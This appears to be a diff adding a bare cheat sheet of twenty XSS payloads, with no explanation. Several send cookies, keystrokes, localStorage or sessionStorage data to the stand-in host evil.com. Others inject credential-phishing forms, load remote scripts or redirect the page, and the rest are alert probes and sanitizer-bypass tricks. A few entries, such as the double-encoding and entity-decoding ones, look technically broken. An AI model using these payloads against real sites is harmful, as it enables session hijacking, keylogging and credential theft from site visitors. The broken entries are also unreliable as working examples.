@@ -1,0 +1,112 @@
+1. Steal Cookies
+----------------
+<script>
+  new Image().src="http://evil.com/cookie?c="+document.cookie;
+</script>
+
+2. Keylogger
+------------
+<script>
+  document.onkeypress = function(e) {
+    fetch('http://evil.com/keystrokes?key='+String.fromCharCode(e.which));
+  };
+</script>
+
+3. Redirect to Another Site
+----------------------------
+<script>
+  window.location = 'http://evil.com';
+</script>
+
+4. Load External Script
+-----------------------
+<script src="http://evil.com/malicious.js"></script>
+
+5. Phishing Form
+----------------
+<script>
+  document.body.innerHTML += '<form action="http://evil.com/phish" method="post"><input type="text" name="username"><input type="password" name="password"><input type="submit"></form>';
+</script>
+
+6. Execute on Mouse Click
+-------------------------
+<div onclick="alert('XSS');">Click me!</div>
+
+7. Retrieve Local Storage Data
+------------------------------
+<script>
+  fetch('http://evil.com/localstorage?data='+JSON.stringify(localStorage));
+</script>
+
+8. Steal Session Storage
+------------------------
+<script>
+  fetch('http://evil.com/sessionstorage?data='+JSON.stringify(sessionStorage));
+</script>
+
+9. Bypass HTML Sanitizers (Double Encoding)
+-------------------------------------------
+<script>
+  %253Cscript%253Ealert(1)%253C/script%253E
+</script>
+
+10. DOM Based XSS
+-----------------
+<a href="javascript:alert(document.domain)">Click me!</a>
+
+11. iframe Injection
+--------------------
+<iframe src="http://evil.com"></iframe>
+
+12. SVG XSS
+-----------
+<svg/onload=alert(document.cookie)>
+
+13. Image XSS
+-------------
+<img src="x" onerror="alert(document.cookie);">
+
+14. Event Handler XSS
+---------------------
+<button onclick="alert('XSS')">Click me</button>
+
+15. XSS in CSS
+--------------
+<style>
+  body {
+    background-image: url("javascript:alert('XSS')");
+  }
+</style>
+
+16. Malicious Link
+------------------
+<a href="javascript:alert('XSS')">Click here</a>
+
+17. HTML Entity Encoding Bypass
+-------------------------------
+<script>
+  var encoded = "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert(document.cookie)&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;";
+  document.write(decodeURIComponent(encoded));
+</script>
+
+18. Blind XSS (to test where it is executed)
+--------------------------------------------
+<script>
+  var img = new Image();
+  img.src = 'http://evil.com/'+document.domain;
+</script>
+
+19. WebSocket Data Theft
+------------------------
+<script>
+  var ws = new WebSocket('ws://evil.com/socket');
+  ws.onopen = function() {
+    ws.send(document.cookie);
+  };
+</script>
+
+20. Advanced Phishing Page
+--------------------------
+<script>
+  document.body.innerHTML = '<h1>Login</h1><form action="http://evil.com/phish" method="post"><input type="text" name="username"><input type="password" name="password"><input type="submit" value="Login"></form>';
+</script>
